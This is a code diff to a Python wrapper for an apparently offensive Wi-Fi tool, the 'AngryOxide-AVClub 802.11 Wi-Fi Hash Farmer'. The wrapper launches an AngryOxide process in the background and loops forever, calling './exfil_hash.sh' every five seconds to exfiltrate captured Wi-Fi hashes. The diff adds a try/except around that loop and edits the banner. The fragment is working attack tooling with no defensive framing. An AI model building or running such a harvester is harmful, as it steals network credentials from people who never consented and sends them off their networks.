@@ -15,7 +15,7 @@ WELCOME_MESSAGE = \
 + r"|| /_/   \_\___/          /_/   \_\_/  \____| ||"  + " Build 250915\n"\
 + r"||                                            ||"  + "\n"\
 + r">>============================================<<"  + "\n"\
-+ "[*] AngryOxide-AVClub Version (AVC) 802.11 Wi-Fi Hash Farmer starting up...\n"\
++ "[*] AngryOxide-AVClub 802.11 Wi-Fi Hash Farmer starting up...\n"\
 + "[!] Send SIGINT (Ctrl-C) to exit.\n"
 
 EXFIL_INTERVAL = 5  # Interval in seconds to exfiltrate hashes
@@ -34,11 +34,15 @@ def main():
     ao1p = subprocess.Popen([ao1], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     #ao2p = subprocess.Popen([ao2], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     while True:
-        print(f"[*] Exfiltrating hashes every {EXFIL_INTERVAL} seconds...")
-        subprocess.run(["./exfil_hash.sh"])
-        time.sleep(EXFIL_INTERVAL)
-    ao1p.terminate()
-    #ao2p.terminate()
+        try:
+            print(f"[*] Exfiltrating hashes every {EXFIL_INTERVAL} seconds...")
+            subprocess.run(["./exfil_hash.sh"])
+            time.sleep(EXFIL_INTERVAL)
+        except Exception as e:
+            print(f"[!] Exception occurred: {e}")
+            print("[*] Terminating subprocesses...")
+            ao1p.terminate()
+            #ao2p.terminate()
 
 # ======================
 # Main Loop
